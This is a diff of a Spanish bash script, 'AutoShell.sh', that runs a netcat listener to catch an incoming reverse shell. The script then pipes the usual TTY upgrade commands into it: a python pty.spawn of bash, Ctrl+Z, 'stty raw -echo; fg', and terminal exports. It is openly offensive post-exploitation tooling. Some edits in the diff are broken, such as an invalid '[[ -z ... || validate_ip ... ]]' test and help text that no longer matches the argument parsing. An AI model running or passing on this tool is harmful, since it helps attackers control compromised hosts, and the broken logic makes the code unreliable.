@@ -1,13 +1,12 @@
 #!/usr/bin/env bash
 
 # AutoShell.sh - Estabilizador 100% Automático de Reverse Shells
-# Versión: 3.0
-
+# Versión: 4.0
 set -e
 IFS=$'\n\t'
 
 # Configuración por defecto
-DEFAULT_IP="0.0.0.0"
+DEFAULT_IP=""
 DEFAULT_PORT="4444"
 TIMEOUT=30
 
@@ -25,7 +24,7 @@ show_help() {
     echo "  $0 (sin parámetros para modo interactivo)"
     echo -e "\n${BLUE}Ejemplos:${NC}"
     echo "  $0 192.168.1.10 4444"
-    echo "  $0 0.0.0.0 8080"
+    echo "  $0 8080"
     exit 0
 }
 
@@ -44,14 +43,14 @@ validate_ip() {
     local ip=$1
     local stat=1
 
-    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+    if [[ $ip =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
         IFS='.' read -r -a octets <<< "$ip"
         [[ ${octets[0]} -le 255 && ${octets[1]} -le 255 && \
            ${octets[2]} -le 255 && ${octets[3]} -le 255 ]]
         stat=$?
-    elif [[ $ip =~ ^[0-9a-fA-F:]+$ ]]; then # IPv6
+    elif [[ $ip =~ ^[0-9a-fA-F:]+$ ]]; then
         stat=0
-    elif [[ $ip == "localhost" || $ip == "0.0.0.0" ]]; then
+    elif [[ $ip == "localhost" ]]; then
         stat=0
     fi
 
@@ -70,9 +69,9 @@ ask_parameters() {
     echo -e "${BLUE}[*] Modo interactivo${NC}"
 
     while :; do
-        read -p "Introduce IP [${DEFAULT_IP}]: " ip
+        read -p "Introduce IP [${DEFAULT_IP:-auto}]: " ip
         ip=${ip:-$DEFAULT_IP}
-        if validate_ip "$ip"; then
+        if [[ -z "$ip" || validate_ip "$ip" ]]; then
             break
         else
             echo -e "${RED}[!] IP no válida${NC}"
@@ -97,13 +96,13 @@ ask_parameters() {
 check_deps() {
     local missing=()
     local cmds=("nc" "mkfifo" "stty")
-    
+
     for cmd in "${cmds[@]}"; do
         if ! command -v $cmd &>/dev/null; then
             missing+=("$cmd")
         fi
     done
-    
+
     if [[ ${#missing[@]} -gt 0 ]]; then
         echo -e "${RED}[!] Faltan dependencias: ${missing[*]}${NC}"
         echo -e "${YELLOW}[*] Instala con: sudo apt install ${missing[*]}${NC}"
@@ -111,27 +110,21 @@ check_deps() {
     fi
 }
 
-# Detectar la variante de netcat disponible
+# Detectar variante de netcat
 detect_nc_variant() {
     local nc_help
     nc_help=$(nc -h 2>&1 || nc --help 2>&1 || netcat -h 2>&1 || netcat --help 2>&1)
-    
+
     if echo "$nc_help" | grep -q "\-e"; then
-        # Variante con soporte para -e (tradicional)
         NC_LISTENER="nc -lvp $PORT"
-        [[ "$LISTEN_IP" != "0.0.0.0" ]] && NC_LISTENER="$NC_LISTENER -s $LISTEN_IP"
     elif echo "$nc_help" | grep -q "\-c"; then
-        # Variante con soporte para -c (ncat)
         NC_LISTENER="nc -lvnp $PORT"
-        [[ "$LISTEN_IP" != "0.0.0.0" ]] && NC_LISTENER="$NC_LISTENER --source $LISTEN_IP"
     else
-        # Variante OpenBSD/Debian
         NC_LISTENER="nc -lvnp $PORT"
-        [[ "$LISTEN_IP" != "0.0.0.0" ]] && NC_LISTENER="$NC_LISTENER -s $LISTEN_IP"
     fi
 }
 
-# Detectar altura y anchura del terminal
+# Detectar tamaño del terminal
 get_terminal_size() {
     if command -v stty &>/dev/null; then
         TERM_ROWS=$(stty size 2>/dev/null | awk '{print $1}')
@@ -145,7 +138,6 @@ get_terminal_size() {
 # Main
 trap cleanup SIGINT SIGTERM EXIT
 
-# Procesar argumentos
 if [[ "$1" == "-h" || "$1" == "--help" ]]; then
     show_help
 fi
@@ -155,7 +147,7 @@ if [[ $# -eq 2 ]]; then
         LISTEN_IP=$1
         PORT=$2
         echo -e "${GREEN}[+] Parámetros validados:${NC}"
-        echo -e "    - IP: $LISTEN_IP"
+        echo -e "    - IP: ${LISTEN_IP:-Todas las interfaces}"
         echo -e "    - Puerto: $PORT"
     else
         echo -e "${RED}[!] Argumentos no válidos${NC}"
@@ -172,21 +164,19 @@ check_deps
 detect_nc_variant
 get_terminal_size
 
-# Crear FIFO para comunicación bidireccional
+# Crear FIFO
 rm -f /tmp/input /tmp/output 2>/dev/null || true
 mkfifo /tmp/input /tmp/output
 
-# Iniciar listener
-echo -e "${YELLOW}[*] Iniciando listener en ${LISTEN_IP}:${PORT}${NC}"
+echo -e "${YELLOW}[*] Iniciando listener en ${LISTEN_IP:-Todas las interfaces}:${PORT}${NC}"
+echo -e "${YELLOW}[*] Ejecutando: $NC_LISTENER${NC}"
 
-# Ejecutar netcat con redirección de entrada/salida
+# Iniciar listener
 ( $NC_LISTENER < /tmp/input > /tmp/output 2>&1 ) &
 NC_PID=$!
 
-# Monitorear la conexión
 echo -e "${YELLOW}[*] Esperando conexión...${NC}"
 
-# Leer la salida de netcat y buscar conexión
 while IFS= read -r line || [[ -n "$line" ]]; do
     echo "$line"
     if [[ "$line" == *"connect"* || "$line" == *"Connection from"* || "$line" == *"Conexión"* ]]; then
@@ -196,29 +186,23 @@ while IFS= read -r line || [[ -n "$line" ]]; do
     fi
 done < <(cat /tmp/output & PID=$!; sleep $TIMEOUT; kill $PID 2>/dev/null)
 
-# Enviar comandos para mejorar la shell
 {
     echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || /usr/bin/script -qc /bin/bash /dev/null"
-    sleep 1
-    # Ctrl+Z
+    sleep 2
     echo -e "\x1A"
-    sleep 1
-    # Configurar terminal
+    sleep 2
     echo "stty raw -echo ; fg"
-    sleep 1
+    sleep 2
     echo ""
-    sleep 1
-    # Configurar variables
+    sleep 2
     echo "reset"
-    sleep 1
+    sleep 2
     echo "export SHELL=bash"
     echo "export TERM=xterm-256color"
     echo "stty rows $TERM_ROWS cols $TERM_COLS"
     echo "clear"
-    # Mensaje de éxito
     echo "echo -e '\033[0;32m[+] Shell mejorada con éxito!\033[0m # ¡Shell interactiva lista!'"
 } > /tmp/input
 
-# Mantener el script en ejecución
 cat /tmp/output &
 cat > /tmp/input
